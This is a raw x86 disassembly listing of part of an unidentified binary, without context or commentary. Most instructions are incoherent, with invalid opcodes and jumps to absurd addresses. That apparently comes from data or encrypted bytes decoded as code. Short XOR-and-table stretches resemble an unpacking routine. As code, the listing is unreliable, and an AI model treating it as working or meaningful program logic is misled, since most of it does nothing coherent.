  405051:	test   eax,0x39d005c5
  405056:	mov    esi,0x2731cd29
  40505b:	jne    0x40501e
  40505d:	add    eax,0x899b0130
  405062:	loop   0x405068
  405064:	mov    dl,0xbc
  405066:	inc    edx
  405067:	push   eax
  405068:	sub    eax,0x69245bc
  40506d:	adc    al,0x51
  40506f:	cs retf 0xcc31
  405073:	fistp  WORD PTR [esi]
  405075:	ret    0x245f
  405078:	fwait
  405079:	test   dl,bl
  40507b:	je     0x40504f
  40507d:	mov    al,0xdc
  40507f:	xchg   edx,eax
  405080:	lods   al,BYTE PTR ds:[esi]
  405081:	mov    esp,DWORD PTR [edi]
  405083:	mov    ch,0x2c
  405085:	int3   
  405086:	cmp    eax,0x5829427d
  40508b:	loopne 0x4050dc
  40508d:	pop    ss
  40508e:	(bad)  
  40508f:	ret    
  405090:	int    0x40
  405092:	sub    DWORD PTR [edx+0x30],eax
  405095:	repz fdiv QWORD PTR [eax+eiz*8]
  405099:	jmp    0x94204b74
  40509e:	pop    es
  40509f:	mul    DWORD PTR [esi-0x171df89c]
  4050a5:	push   edx
  4050a6:	pop    ebx
  4050a7:	dec    ebx
  4050a8:	inc    ebx
  4050a9:	mov    ecx,0xf7be3cdc
  4050ae:	sub    esp,DWORD PTR [eax+0xf]
  4050b1:	sti    
  4050b2:	int3   
  4050b3:	adc    eax,0x87b0aed0
  4050b8:	xor    DWORD PTR [esp+edi*8-0x5d406ad5],edi
  4050bf:	xor    eax,0x77724eac
  4050c4:	xor    dh,BYTE PTR ds:0x8d68bf29
  4050ca:	int    0xff
  4050cc:	sub    edi,eax
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx+0x599afdfe],bh
  4050fc:	lahf   
  4050fd:	call   0x4db8c932
  405102:	jle    0x40517c
  405104:	js     0x4050c9
  405106:	pop    ss
  405107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405108:	stos   BYTE PTR es:[edi],al
  405109:	inc    ecx
  40510a:	pop    esi
  40510b:	or     eax,0x618f254f
  405110:	sub    cl,BYTE PTR [eax+ebx*1+0x3c]
  405114:	jne    0x40512e
  405116:	call   0xb33a8ce2
  40511b:	mov    ds:0xf557e184,al
  405120:	adc    ebp,DWORD PTR [ebx+0x36f2d4ec]
  405126:	xchg   esi,eax
  405127:	leave  
  405128:	fs aas 
  40512a:	retf   0xbf81
  40512d:	ja     0x40514d
  40512f:	cwde   
  405130:	cmp    BYTE PTR ds:0xab1862f4,dh
  405136:	ins    BYTE PTR es:[edi],dx
  405137:	jp     0x40514b
  405139:	mov    eax,0x2ffef994
  40513e:	mov    eax,ds:0x5834afa1
  405143:	cmp    esp,DWORD PTR [ecx+ebp*1+0x6]
  405147:	cld    
  405148:	sub    bh,BYTE PTR gs:[ebx]
  40514b:	cld    
  40514c:	ret    0x7d1a
  40514f:	imul   ebp,DWORD PTR [edx+0x1f2b40fa],0x38
  405156:	inc    edx
  405157:	mov    ah,0x97
  405159:	mov    edi,0x231908a3
  40515e:	js     0x4051c4
  405160:	sahf   
  405161:	xor    ah,ah
  405163:	and    dh,0x96
  405166:	leave  
  405167:	in     al,dx
  405168:	add    eax,0xb7d79ec4
  40516d:	outs   dx,BYTE PTR ds:[esi]
  40516e:	rcr    bh,1
  405170:	cmp    esi,DWORD PTR [ebx+0x5c6cae63]
  405176:	pop    edi
  405177:	rol    BYTE PTR [ecx+0x38],0xa6
  40517b:	sub    BYTE PTR [ebx+0xe],dl
  40517e:	gs adc al,0x92
  405181:	lods   eax,DWORD PTR ds:[esi]
  405182:	test   DWORD PTR [ebx],esp
  405184:	xor    al,0x7e
  405186:	jecxz  0x40518a
  405188:	jmp    0x4051e0
  40518a:	xchg   BYTE PTR [edi-0x38],dl
  40518d:	addr16 aas 
  40518f:	call   0x6c12:0x6dcda173
  405196:	cs aas 
  405198:	addr16 xor ah,ah
  40519b:	push   eax
  40519c:	loop   0x40514b
  40519e:	pop    ebp
  40519f:	adc    ecx,DWORD PTR [ecx-0x32344325]
  4051a5:	inc    eax
  4051a6:	fst    QWORD PTR [ecx]
  4051a8:	pop    ebx
  4051a9:	call   DWORD PTR [ebx+edi*8-0x6c]
  4051ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051ae:	fld    QWORD PTR ss:[ecx]
  4051b1:	jo     0x4051cf
  4051b3:	jecxz  0x4051dc
  4051b5:	push   ebp
  4051b6:	xor    ebx,DWORD PTR [edx]
  4051b8:	jmp    0xea8c9d79
  4051bd:	fiadd  DWORD PTR ds:0xdf2d
  4051c2:	daa    
  4051c3:	aas    
  4051c4:	push   ss
  4051c5:	loope  0x40515b
  4051c7:	inc    ebx
  4051c8:	inc    ebp
  4051c9:	lock popa 
  4051cb:	loope  0x40514e
  4051cd:	or     DWORD PTR [edx+0x12],edi
  4051d0:	scas   al,BYTE PTR es:[edi]
  4051d1:	sbb    DWORD PTR [edi+0x5ef49455],eax
  4051d7:	pushf  
  4051d8:	xchg   edi,eax
  4051d9:	add    BYTE PTR [edx-0x4d],dl
  4051dc:	pushf  
  4051dd:	and    ebx,ecx
  4051df:	mov    ?,WORD PTR [edx-0x79]
  4051e2:	call   0xc8efcc90
  4051e7:	adc    BYTE PTR [esi+0x58],bh
  4051ea:	sbb    al,0x3
  4051ec:	fimul  WORD PTR [edi+0x250bc13c]
  4051f2:	(bad)  
  4051f3:	repnz cdq 
  4051f5:	jmp    0x4051c9
  4051f7:	cs mov bh,0x8d
  4051fa:	or     edx,esp
  4051fc:	adc    BYTE PTR [edx-0x5e],ch
  4051ff:	stc    
  405200:	or     BYTE PTR [edi-0x29],dh
  405203:	inc    ecx
  405204:	pop    es
  405205:	mov    dh,0xa4
  405207:	mov    esi,0x88185ba3
  40520c:	or     eax,0xb3b541cf
  405211:	or     eax,edi
  405213:	push   cs
  405214:	xor    al,0x9f
  405216:	retf   
  405217:	push   ecx
  405218:	aad    0xd4
  40521a:	imul   edx,DWORD PTR [edi+0x7e],0x29
  40521e:	or     bl,BYTE PTR [ebp-0x5]
  405221:	jge    0x4051d7
  405223:	mov    esi,0xb2ab172e
  405228:	jo     0x405200
  40522a:	popf   
  40522b:	(bad)  
  40522c:	into   
  40522d:	jns    0x40528a
  40522f:	fcomp  DWORD PTR ss:[ecx-0x2d3ab08e]
  405236:	push   esp
  405237:	inc    esp
  405238:	mov    bl,0x31
  40523a:	lock mov esp,DWORD PTR [esi]
  40523d:	sub    eax,0x4b8998e7
  405242:	rcr    BYTE PTR [edx-0x57],1
  405245:	push   ss
  405246:	push   ds
  405247:	outs   dx,DWORD PTR ds:[esi]
  405248:	xchg   DWORD PTR [edx],esi
  40524a:	out    0x6d,eax
  40524c:	repz mov ?,WORD PTR [esi]
  40524f:	and    al,0xd1
  405251:	mov    edi,0x4bd12d2c
  405256:	adc    al,0xcd
  405258:	stos   BYTE PTR es:[edi],al
  405259:	out    0xef,eax
  40525b:	int3   
  40525c:	cdq    
  40525d:	shr    BYTE PTR [eax+eiz*4],1
  405260:	jb     0x40528f
  405262:	mov    BYTE PTR [esi+0x55175cf],0xf1
  405269:	fs icebp 
  40526b:	or     ebp,ecx
  40526d:	test   eax,0x94538825
  405272:	ret    0x9454
  405275:	cwde   
  405276:	push   edi
  405277:	jae    0x40526b
  405279:	retf   
  40527a:	mov    ebx,0xa42509c2
  40527f:	jnp    0x4052ea
  405281:	je     0x4052c9
  405283:	adc    eax,0xe5e63cd
  405288:	enter  0x7bc7,0xf8
  40528c:	jae    0x40526a
  40528e:	call   0xe3e1:0xd2d59f2b
  405295:	fadd   DWORD PTR [esi+0x15]
  405298:	jg     0x4052ad
  40529a:	aad    0x4a
  40529c:	mov    dh,0x47
  40529e:	fidiv  DWORD PTR [ecx+ebx*1]
  4052a1:	push   ebp
  4052a2:	sahf   
  4052a3:	xchg   bl,bl
  4052a5:	xor    DWORD PTR [ebx+0x6fe6de56],0xffffffe7
  4052ac:	int3   
  4052ad:	xor    eax,0xfbc572f4
  4052b2:	out    dx,al
  4052b3:	xchg   edi,eax
  4052b4:	clc    
  4052b5:	(bad)  
  4052b6:	mov    ?,esp
  4052b8:	dec    esp
  4052b9:	cld    
  4052ba:	call   0x77d73023
  4052bf:	std    
  4052c0:	jl     0x405267
  4052c2:	fwait
  4052c3:	sbb    BYTE PTR [eax-0x6a0a37ef],dl
  4052c9:	mov    ds,WORD PTR [esi+0x11c4242]
  4052cf:	int3   
  4052d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052d1:	inc    ebx
  4052d2:	mov    edx,0xa7ebc4a0
  4052d7:	les    eax,FWORD PTR [eax]
  4052d9:	mov    cs,esp
  4052db:	nop
  4052dc:	inc    ecx
  4052dd:	or     esp,esp
  4052df:	adc    al,0x7b
  4052e1:	(bad)  
  4052e2:	std    
  4052e3:	pop    ds
  4052e4:	mov    esi,0x1a36c1fa
  4052e9:	sbb    eax,0xd57f26ce
  4052ee:	xlat   BYTE PTR ds:[ebx]
  4052ef:	nop
  4052f0:	jecxz  0x4052df
  4052f2:	or     dl,dl
  4052f4:	jp     0x40536b
  4052f6:	sbb    al,0x56
  4052f8:	xchg   ecx,eax
  4052f9:	jmp    0xfdb6:0x35d11b5e
  405300:	pop    ebp
  405301:	dec    eax
  405302:	(bad)  
  405303:	shl    DWORD PTR [esi],1
  405305:	or     bl,BYTE PTR [ebp-0x1c]
  405308:	pop    es
  405309:	inc    DWORD PTR ds:0x7b8824f6
  40530f:	inc    ebx
  405310:	pop    es
  405311:	or     eax,0xe0d73659
  405316:	lock in al,dx
  405318:	xor    esp,ebp
  40531a:	test   BYTE PTR [eax-0x1e6b4257],al
  405320:	mov    ebp,0xe8e7919b
  405325:	pop    eax
  405326:	jbe    0x405365
  405328:	mov    esi,0x3de32fb3
  40532d:	sub    bl,BYTE PTR [ecx+0x6c]
  405330:	push   0xe
  405332:	xchg   al,dh
  405334:	adc    al,0xc0
  405336:	pop    es
  405337:	adc    DWORD PTR [esi-0x67211096],ebx
  40533d:	test   DWORD PTR [edx-0x12],0xba9980c7
  405344:	test   eax,0x14b59c46
  405349:	popf   
  40534a:	je     0x40539c
  40534c:	mov    eax,0xa89976bc
  405351:	add    BYTE PTR [eax+eiz*4],0xa2
  405355:	les    edx,FWORD PTR ds:0x35eb5996
  40535b:	out    dx,eax
  40535c:	dec    eax
  40535d:	mov    ebx,0x8f7c19b6
  405362:	push   0x10c7949f
  405367:	aaa    
  405368:	jbe    0x4052f6
  40536a:	test   BYTE PTR ds:0x6ad16e6d,ah
  405370:	in     eax,dx
  405371:	out    dx,al
  405372:	mov    ch,0xe5
  405374:	sub    eax,DWORD PTR [edi-0x504a6aee]
  40537a:	xchg   ebp,eax
  40537b:	push   0xffffffae
  40537d:	retf   
  40537e:	lods   al,BYTE PTR ds:[esi]
  40537f:	and    edi,DWORD PTR [edi]
  405381:	mov    WORD PTR [edi+0x5a],?
  405384:	add    BYTE PTR [edi+0x6f8a271f],dl
  40538a:	mov    edx,0x869b602e
  40538f:	pop    eax
  405390:	adc    DWORD PTR [ebx-0x35d9e2eb],edx
  405396:	push   ecx
  405397:	mov    ds:0x4e5b884f,eax
  40539c:	pop    ebp
  40539d:	cmc    
  40539e:	aad    0xaa
  4053a0:	or     BYTE PTR [ebp-0x30bf57ab],cl
  4053a6:	pop    esp
  4053a7:	scas   al,BYTE PTR es:[edi]
  4053a8:	xor    ecx,DWORD PTR [edx]
  4053aa:	nop
  4053ab:	mov    bh,BYTE PTR [ebx-0x8]
  4053ae:	pushf  
  4053af:	push   ebp
  4053b0:	imul   BYTE PTR [edx-0x6cc85f0e]
  4053b6:	xchg   ebx,eax
  4053b7:	cmp    eax,0xcf5b6f42
  4053bc:	mov    ?,esi
  4053be:	(bad)  
  4053bf:	scas   eax,DWORD PTR es:[edi]
  4053c0:	outs   dx,BYTE PTR ds:[esi]
  4053c1:	ret    
  4053c2:	add    BYTE PTR cs:[esi+0x67],0xf5
  4053c7:	mov    eax,0x55df49b3
  4053cc:	jbe    0x40542c
  4053ce:	iret   
  4053cf:	pop    esi
  4053d0:	ss stos BYTE PTR es:[edi],al
  4053d2:	repz pop edx
  4053d4:	adc    DWORD PTR [ecx],esi
  4053d6:	dec    ebp
  4053d7:	cmp    BYTE PTR [ebx-0x141607bb],cl
  4053dd:	add    al,BYTE PTR [eax]
  4053df:	add    ch,cl
  4053e1:	rcl    edx,cl
  4053e3:	(bad)  
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fsubr  st(0),st
  4053ed:	inc    ebx
  4053ee:	xor    eax,DWORD PTR [ecx]
  4053f0:	cmp    eax,0x4d787835
  4053f5:	jle    0x40546f
  4053f7:	js     0x4053ee
  4053f9:	xchg   BYTE PTR [ecx-0x48638f8d],dl
  4053ff:	xchg   ebx,eax
  405400:	jecxz  0x405451
  405402:	shr    BYTE PTR [ebp-0x2a],0x63
  405406:	ja     0x405485
  405408:	sub    al,0x46
  40540a:	shl    DWORD PTR [edx+0x509123d2],cl
  405410:	cmp    edx,esp
  405412:	sub    ch,dl
  405414:	or     ah,BYTE PTR [esi]
  405416:	call   0x7e62:0x31ba9d1
  40541d:	or     ecx,DWORD PTR [esi+0x20017aca]
  405423:	and    BYTE PTR [ecx],ah
  405425:	ins    DWORD PTR es:[edi],dx
  405426:	ret    0x9432
  405429:	cmp    edi,DWORD PTR [edx-0x4a]
  40542c:	ja     0x405497
  40542e:	dec    edi
  40542f:	pusha  
  405430:	rcl    BYTE PTR [edx+0x571bd862],cl
  405436:	xchg   ebx,eax
  405437:	test   DWORD PTR [edi-0x10],eax
  40543a:	mov    ds:0x916dbae5,al
  40543f:	repz into 
  405441:	jge    0x405464
  405443:	ret    
  405444:	xchg   ebp,eax
  405445:	add    eax,0x8ce2b8d1
  40544a:	jecxz  0x405415
  40544c:	and    al,0x6a
  40544e:	sahf   
  40544f:	push   0xffffffc4
  405451:	mov    BYTE PTR [ebx-0x144a21],al
  405457:	out    dx,al
  405458:	push   ebx
  405459:	daa    
  40545a:	(bad)  
  40545b:	scas   eax,DWORD PTR es:[edi]
  40545c:	sbb    BYTE PTR [ebx-0x42],al
  40545f:	arpl   WORD PTR [ebx+0x20],bx
  405462:	call   0x3a1c:0x52c7673d
  405469:	mov    ah,0xb2
  40546b:	mov    dh,BYTE PTR [esi+0x37279a31]
  405471:	or     al,0x4c
  405473:	cmp    DWORD PTR [ecx+0x4d6902b8],edx
  405479:	and    al,0xf9
  40547b:	xor    al,0x1c
  40547d:	mov    ss,WORD PTR [edx]
  40547f:	mov    edx,0x315f040e
  405484:	hlt    
  405485:	test   eax,0xb4f2eb21
  40548a:	dec    edx
  40548b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40548c:	jp     0x40547a
  40548e:	addr16 inc ebp
  405490:	pop    ebx
  405491:	not    BYTE PTR [ecx]
  405493:	mov    eax,0xfb7a5710
  405498:	inc    ebx
  405499:	popa   
  40549a:	iret   
  40549b:	repnz imul ebp,DWORD PTR ds:0x4c96ea96,0xe5bb29be
  4054a6:	js     0x4054a3
  4054a8:	hlt    
  4054a9:	imul   eax,ebx,0x65143a7e
  4054af:	pusha  
  4054b0:	jge    0x405519
  4054b2:	mov    edi,eax
  4054b4:	push   ds
  4054b5:	in     al,dx
  4054b6:	fadd   st(3),st
  4054b8:	mov    esi,0xe4c2558e
  4054bd:	xor    dl,0xe1
  4054c0:	test   DWORD PTR [esi-0x35ec3763],edi
  4054c6:	xor    edi,ebx
  4054c8:	lods   eax,DWORD PTR ds:[esi]
  4054c9:	push   edi
  4054ca:	aam    0xa5
  4054cc:	fsubr  DWORD PTR [ecx]
  4054ce:	out    0x22,eax
  4054d0:	into   
  4054d1:	dec    BYTE PTR [edi+0x98bcc52]
  4054d7:	mov    al,ds:0xddca2a3c
  4054dc:	mov    esp,gs
  4054de:	xchg   ebx,eax
  4054df:	push   ss
  4054e0:	sub    al,0xf6
  4054e2:	out    dx,al
  4054e3:	mov    DWORD PTR [edi+0x1a524215],ebx
  4054e9:	ss ja  0x4054f5
  4054ec:	push   esi
  4054ed:	fld    QWORD PTR [esi-0x61]
  4054f0:	cs test esi,edi
  4054f3:	and    edx,DWORD PTR [ecx-0x4d13588f]
  4054f9:	int    0x92
  4054fb:	fcomp  DWORD PTR [ecx+ecx*1-0x6e]
  4054ff:	aaa    
  405500:	inc    eax
  405501:	mov    eax,0xdbd0dc53
  405506:	lds    ebp,FWORD PTR [esi-0x27]
  405509:	xchg   esi,eax
  40550a:	add    BYTE PTR [di],ah
  40550d:	addr16 push edi
  40550f:	cli    
  405510:	and    DWORD PTR [edx],ebx
  405512:	aam    0xa3
  405514:	sub    esp,ebp
  405516:	cmp    eax,0x38e92810
  40551b:	mov    ch,0x82
  40551d:	popa   
  40551e:	std    
  40551f:	xlat   BYTE PTR ds:[ebx]
  405520:	sbb    eax,esp
  405522:	xor    BYTE PTR [ebp-0x61],0x76
  405526:	jmp    0x41694b0f
  40552b:	iret   
  40552c:	mul    DWORD PTR [esi-0x479f2d67]
  405532:	iret   
  405533:	adc    BYTE PTR ds:0x6f6551e5,bh
  405539:	jbe    0x405525
  40553b:	cwde   
  40553c:	dec    eax
  40553d:	stos   DWORD PTR es:[edi],eax
  40553e:	lea    ecx,[ecx+0x3849278e]
  405544:	shr    DWORD PTR cs:[ebx],cl
  405547:	lock xor BYTE PTR [ecx+ebx*1],al
  40554b:	cdq    
  40554c:	jns    0x40556f
  40554e:	ror    DWORD PTR [ecx+eiz*2],1
  405551:	test   eax,0x7ebff419
  405556:	sbb    BYTE PTR [ebp+0x70],dh
  405559:	xchg   ebp,eax
  40555a:	xchg   ebx,eax
  40555b:	mov    ds:0xcd6e79cf,al
  405560:	ss stos DWORD PTR es:[edi],eax
  405562:	push   ebp
  405563:	add    edx,eax
  405565:	adc    eax,0x29741f6
  40556a:	dec    DWORD PTR [ecx]
  40556c:	mov    dh,0x40
  40556e:	jb     0x4055b8
  405570:	jge    0x4055a8
  405572:	nop
  405573:	call   0x3ce9a120
  405578:	sbb    eax,DWORD PTR [edx-0x61]
  40557b:	lods   al,BYTE PTR ds:[esi]
  40557c:	fadd   QWORD PTR [esi]
  40557e:	dec    esi
  40557f:	mov    ecx,0x85170361
  405584:	xchg   ebp,eax
  405585:	leave  
  405586:	aam    0xd9
  405588:	hlt    
  405589:	mov    al,ds:0xa4d1449d
  40558e:	ret    0x8b1c
  405591:	cmp    al,BYTE PTR [edx]
  405593:	inc    ebx
  405594:	lahf   
  405595:	mov    esi,0x44fb6703
  40559a:	scas   eax,DWORD PTR es:[edi]
  40559b:	sbb    al,0xaf
  40559d:	xor    eax,DWORD PTR [esp+ebx*8-0x45]
  4055a1:	jmp    0x4055b6
  4055a3:	sbb    al,0xd0
  4055a5:	(bad)  
  4055a6:	scas   eax,DWORD PTR es:[edi]
  4055a7:	scas   eax,DWORD PTR es:[edi]
  4055a8:	in     eax,dx
  4055a9:	js     0x405542
  4055ab:	mov    edi,0x6aafd767
  4055b0:	sti    
  4055b1:	pop    eax
  4055b2:	retf   0xf765
  4055b5:	cmp    BYTE PTR [eax-0x78fddf94],ah
  4055bb:	je     0x405554
  4055bd:	popa   
  4055be:	pop    edx
  4055bf:	int    0xcb
  4055c1:	push   es
  4055c2:	or     eax,0xa0e1f186
  4055c7:	rcr    BYTE PTR [ecx-0x2d314739],cl
  4055cd:	mov    dh,0xa3
  4055cf:	mov    ds:0xca6c29c0,eax
  4055d4:	(bad)  fs:[ecx-0xe]
  4055d8:	pop    ds
  4055d9:	dec    edx
  4055da:	inc    ebx
  4055db:	in     al,dx
  4055dc:	mov    dh,0xf6
  4055de:	adc    edi,DWORD PTR [eax-0x3c]
  4055e1:	popa   
  4055e2:	sub    BYTE PTR [ebx+0x57b8c7de],0xb7
  4055e9:	xor    eax,0xd05f108
  4055ee:	mov    eax,ds:0x71822c8
  4055f3:	data16 fcomp QWORD PTR [eax]
  4055f6:	icebp  
  4055f7:	xchg   BYTE PTR [edx-0x1b979167],al
  4055fd:	jl     0x405657
  4055ff:	and    eax,0x41dfb65a
  405604:	jae    0x40561f
  405606:	mov    eax,0xc9fd87f5
  40560b:	inc    edi
  40560c:	call   0xbde:0xee30bfa0
  405613:	mov    edi,0xb518751d
  405618:	iret   
  405619:	lods   al,BYTE PTR ds:[esi]
  40561a:	xor    eax,0x1c769fa8
  40561f:	pop    eax
  405620:	push   ds
  405621:	or     DWORD PTR [eax+0x2e512c4a],eax
  405627:	sub    edx,DWORD PTR ds:0x7f871249
  40562d:	cli    
  40562e:	loopne 0x4055e4
  405630:	pop    edi
  405631:	daa    
  405632:	stos   BYTE PTR es:[edi],al
  405633:	and    al,0xa
  405635:	sar    BYTE PTR [esi-0xe1df875],cl
  40563b:	ins    BYTE PTR es:[edi],dx
  40563c:	pop    ecx
  40563d:	sar    BYTE PTR [eax+0x20],cl
  405640:	sub    DWORD PTR [edi+esi*8+0x48],eax
  405644:	jg     0x4056a0
  405646:	mov    edi,0x3fb5d404
  40564b:	call   0x6c3a:0xc0807421
  405652:	rcl    BYTE PTR [edi+eax*1+0x61],cl
  405656:	lods   al,BYTE PTR ds:[esi]
  405657:	add    esi,esi
  405659:	(bad)  
  40565b:	inc    edx
  40565c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40565d:	sti    
  40565e:	adc    cl,ah
  405660:	ins    DWORD PTR es:[edi],dx
  405661:	sbb    BYTE PTR [ecx],dl
  405663:	(bad)  
  405664:	mov    ebp,eax
  405666:	add    ebp,DWORD PTR [eax-0x65]
  405669:	pmullw mm2,mm3
  40566c:	fnsave [edi+0x7a]
  40566f:	push   esp
  405670:	addr16 es jno 0x405637
  405674:	pusha  
  405675:	data16 (bad) 
  405677:	mov    ah,0x41
  405679:	sbb    esp,edx
  40567b:	rcr    ebp,1
  40567d:	inc    ebp
  40567e:	ret    0x364
  405681:	(bad)  
  405682:	jp     0x405656
  405684:	std    
  405685:	jge    0x405611
  405687:	mov    dh,0x82
  405689:	push   ecx
  40568a:	mov    ah,BYTE PTR [edi+esi*1+0x1d]
  40568e:	dec    edi
  40568f:	retf   0x7666
  405692:	adc    esp,DWORD PTR [edi+0x2d3d6789]
  405698:	pop    edx
  405699:	test   eax,0x748a8abd
  40569e:	pop    eax
  40569f:	pushf  
  4056a0:	mov    cl,0x65
  4056a2:	scas   al,BYTE PTR es:[edi]
  4056a3:	fcmovb st,st(1)
  4056a5:	mov    eax,0xedacb8df
  4056aa:	and    ch,BYTE PTR [ecx]
  4056ac:	pop    esi
  4056ad:	(bad)  
  4056ae:	(bad)  
  4056af:	jno    0x40572d
  4056b1:	mov    BYTE PTR [ecx-0x76],al
  4056b4:	sub    DWORD PTR [esi-0x4fdf3231],ecx
  4056ba:	mov    al,0xd5
  4056bc:	mov    eax,0x2ca3b69e
  4056c1:	test   DWORD PTR [edx+0x122e64da],edx
  4056c7:	or     al,0x4d
  4056ca:	or     BYTE PTR [ebx-0x6cc0383],0x3
  4056d1:	dec    BYTE PTR [ebx-0x50f0f78b]
  4056d7:	cli    
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	sub    ch,BYTE PTR [edx+0x3a122e04]
  405718:	js     0x405792
  40571a:	dec    ebp
  40571b:	jle    0x405795
  40571d:	js     0x405726
  40571f:	lds    eax,FWORD PTR [ebp+0x5f]
  405722:	ins    DWORD PTR es:[edi],dx
  405723:	sub    DWORD PTR [eax-0x16],esi
  405726:	daa    
  405727:	stc    
  405728:	imul   ebp,DWORD PTR [eax-0x5e],0x5a
  40572c:	add    al,0xac
  40572e:	dec    ebp
  405730:	cwde   
  405731:	mov    dl,0xf0
  405733:	xchg   edx,eax
  405734:	or     eax,esi
  405736:	or     DWORD PTR [edx-0x50],ebp
  405739:	das    
  40573a:	jnp    0x4056d0
  40573c:	fstp   DWORD PTR [ecx-0x80]
  40573f:	and    ecx,DWORD PTR [esi+0x75]
  405742:	jle    0x405763
  405744:	inc    eax
  405745:	xchg   ebx,eax
  405746:	or     bl,ch
  405748:	jo     0x40578e
  40574a:	daa    
  40574b:	sbb    dh,BYTE PTR [eax]
  40574d:	cmc    
  40574e:	hlt    
  40574f:	adc    ecx,ebp
  405751:	in     al,dx
  405752:	jns    0x4056f5
  405754:	fs xchg ecx,eax
  405756:	sti    
  405757:	mov    fs,WORD PTR [esi]
  405759:	ror    DWORD PTR [eax+ebp*8],0xff
  40575d:	mov    bl,0xa6
  40575f:	push   esp
  405760:	add    al,0xf7
  405762:	inc    eax
  405763:	aaa    
  405764:	aas    
  405765:	mov    ebp,0xaafab84
  40576a:	push   esi
  40576b:	xor    al,0x84
  40576d:	jl     0x4056fe
  40576f:	ficomp WORD PTR [edi-0x14]
  405772:	mov    ebx,0xa4463cfb
  405777:	(bad)  
  405778:	in     eax,dx
  405779:	imul   ebx,DWORD PTR [eax+0xa],0x27
  40577d:	pop    esp
  40577e:	fmulp  st(4),st
  405780:	fstp   TBYTE PTR [ebx-0x73ff73b9]
  405786:	adc    dh,BYTE PTR [eax+0xc]
  405789:	arpl   WORD PTR [edx],di
  40578b:	or     DWORD PTR [eax-0x2c553abd],esi
  405791:	pop    edi
  405792:	sub    eax,0x5bb5966f
  405797:	jnp    0x405729
  405799:	xor    al,0x2
  40579b:	or     eax,0x6a8e11ac
  4057a0:	pop    eax
  4057a1:	in     al,dx
  4057a2:	pop    ebx
  4057a3:	out    0x8d,eax
  4057a5:	inc    edx
  4057a6:	sbb    al,0x7f
  4057a8:	in     al,dx
  4057a9:	pop    esi
  4057aa:	add    eax,0xaf07e9e0
  4057af:	js     0x4057db
  4057b1:	loopne 0x40575d
  4057b3:	xchg   BYTE PTR [ebp-0x654ae19b],ah
  4057b9:	and    ebp,DWORD PTR [esi-0x6c]
  4057bc:	and    bl,ah
  4057be:	jbe    0x405783
  4057c0:	out    dx,eax
  4057c1:	mov    DWORD PTR [ebp+eax*2-0x47066a11],ebx
  4057c8:	jecxz  0x405803
  4057ca:	fs mov dl,0x51
  4057cd:	jbe    0x405784
  4057cf:	loope  0x405810
  4057d1:	jge    0x4057e4
  4057d3:	mov    al,ds:0x583fff03
  4057d8:	fxch   st(5)
  4057da:	gs sub al,0xcc
  4057dd:	add    DWORD PTR [eax+eiz*2+0x2f9228af],esp
  4057e4:	enter  0x7eeb,0xb3
  4057e8:	mov    DWORD PTR [edi-0x5afc9819],ebx
  4057ee:	xchg   esi,edi
  4057f0:	inc    eax
  4057f1:	rol    DWORD PTR [ebx],0x97
  4057f4:	gs xchg esp,eax
  4057f6:	fimul  WORD PTR [edi+ebp*1]
  4057fa:	dec    ebp
  4057fb:	scas   al,BYTE PTR es:[edi]
  4057fc:	adc    al,0xd0
  4057fe:	and    bh,BYTE PTR [esi+0x5b5dceae]
  405804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405805:	out    0xd2,eax
  405807:	lds    edx,FWORD PTR [eax+0x567e68e7]
  40580d:	pop    esp
  40580e:	cld    
  40580f:	mov    ch,0x9b
  405811:	test   BYTE PTR [ebp-0x71baa12],bh
  405817:	jmp    0x425d7798
  40581c:	stos   BYTE PTR es:[edi],al
  40581d:	jp     0x40584b
  40581f:	inc    esi
  405820:	pop    edi
  405821:	test   DWORD PTR [ecx+0x7a],esp
  405824:	ret    0x8585
  405827:	cmp    eax,0xa15a2767
  40582c:	jne    0x4057ec
  40582e:	adc    ecx,DWORD PTR [edx+ebp*4+0x44]
  405832:	clc    
  405833:	mov    dh,0x29
  405835:	xchg   ecx,eax
  405836:	call   0xbb8309db
  40583b:	dec    ebx
  40583c:	into   
  40583d:	fimul  DWORD PTR ds:0x622ef6ab
  405843:	xchg   edx,esp
  405845:	jp     0x4057ce
  405847:	jmp    0x6511:0x6de6481b
  40584e:	(bad)  
  40584f:	mov    WORD PTR [edi],gs
  405851:	stc    
  405852:	push   cs
  405853:	adc    eax,0xb53118bd
  405858:	or     bl,BYTE PTR [esi-0x7b558b6b]
  40585e:	pop    ds
  40585f:	repnz in eax,dx
  405861:	cmc    
  405862:	(bad)  
  405863:	loope  0x40587d
  405865:	hlt    
  405866:	mov    ah,BYTE PTR [esp+esi*4+0x40e85904]
  40586d:	fnsave ds:0xca8f4090
  405873:	cwde   
  405874:	xor    DWORD PTR [ecx-0x289ca6c3],0xffffff8d
  40587b:	mov    eax,0x3a6be047
  405880:	dec    edi
  405881:	aad    0x1b
  405883:	nop
  405884:	cwde   
